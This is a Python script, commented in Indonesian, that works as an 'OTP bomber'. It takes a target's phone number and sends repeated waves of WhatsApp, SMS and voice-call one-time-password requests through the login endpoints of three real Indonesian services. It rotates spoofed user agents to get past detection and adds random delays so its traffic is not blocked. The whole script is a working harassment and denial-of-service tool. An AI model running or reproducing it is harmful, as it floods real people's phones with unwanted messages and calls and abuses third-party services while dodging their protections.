import requests
import threading
import time
import random
import os
from datetime import datetime

# --- SETTING WARNA (BIAR GAK LAWAK) ---
G = '\033[32m' # Hijau
R = '\033[31m' # Merah
Y = '\033[33m' # Kuning
W = '\033[37m' # Putih
C = '\033[36m' # Cyan

class SZN_V6_REBORN:
    def __init__(self, target):
        # Auto-format nomor ke standar internasional +62
        self.target = self.format_target(target)
        self.num_only = self.target.replace("+62", "0") # Untuk API yang minta 08
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        
        # Kumpulan identitas HP High-End (Bypass Detector)
        self.ua_list = [
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.63 Mobile Safari/537.36"
        ]

    def format_target(self, num):
        num = num.strip().replace(" ", "").replace("-", "")
        if num.startswith("08"): return "+62" + num[1:]
        if num.startswith("8"): return "+62" + num
        if num.startswith("62"): return "+" + num
        return num

    def get_headers(self, referer):
        return {
            'User-Agent': random.choice(self.ua_list),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': referer,
            'Referer': referer,
            'X-Requested-With': 'XMLHttpRequest'
        }

    def fire(self, mode):
        """Mesin Eksekusi Peluru"""
        try:
            if mode == "WA":
                url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
                data = {"phoneNumber": self.num_only}
                ref = "https://skillacademy.com/"
            elif mode == "SMS":
                url = "https://api.matahari.com/v1/auth/otp"
                data = {"phone": self.num_only, "type": "register"}
                ref = "https://www.matahari.com/"
            elif mode == "CALL":
                url = "https://api.alodokter.com/v1/auth/otp_call"
                data = {"phone": self.num_only}
                ref = "https://www.alodokter.com/"

            # Request dengan Timeout lebih panjang (Anti-Macet)
            res = requests.post(url, json=data, headers=self.get_headers(ref), timeout=20)
            
            with self.lock:
                if res.status_code in [200, 201]:
                    self.success += 1
                    print(f"{G}[{datetime.now().strftime('%H:%M:%S')}] {mode} => SUCCESS!{W}")
                else:
                    self.failed += 1
                    print(f"{R}[{datetime.now().strftime('%H:%M:%S')}] {mode} => GAGAL ({res.status_code}){W}")
        except:
            with self.lock:
                self.failed += 1
                print(f"{Y}[TIMEOUT] Jalur {mode} Sibuk!{W}")

    def storm(self, waves):
        for i in range(waves):
            print(f"\n{C}[ GELOMBANG {i+1} ] Menyerang...{W}")
            ths = []
            for m in ["WA", "SMS", "CALL"]:
                t = threading.Thread(target=self.fire, args=(m,))
                ths.append(t)
                t.start()
            
            for t in ths: t.join()
            
            # AUTO-DELAY ALGORITHM (SZN-Logic)
            # Biar gak gampang kena block, jeda acak 4-8 detik
            wait = random.uniform(4.0, 8.5)
            print(f"{Y}[SYSTEM] Cooling down {wait:.1f}s...{W}")
            time.sleep(wait)

def banner():
    os.system('clear')
    print(f"""{C}
    ╔════════════════════════════════════════╗
    ║     {R}SZN-ULTIMATE V6 {G}(REBORN EDITION){C}     ║
    ║   {W}Target: {G}International +62 Protocol   {C}  ║
    ╚════════════════════════════════════════╝{W}
    """)

if __name__ == "__main__":
    banner()
    target = input(f"{W}Input Nomor (+62/08): ")
    bot = SZN_V6_REBORN(target)
    
    print(f"{G}[!] Target Locked: {bot.target}{W}")
    waves = int(input(f"{W}Jumlah Gelombang Serangan: "))
    
    print(f"\n{R}[!!!] MEMULAI PEMBOMAN...{W}")
    bot.storm(waves)
    
    print(f"\n{C}--- [ LAPORAN SELESAI ] ---")
    print(f"{G}BERHASIL: {bot.success} | {R}GAGAL: {bot.failed}{W}")
            
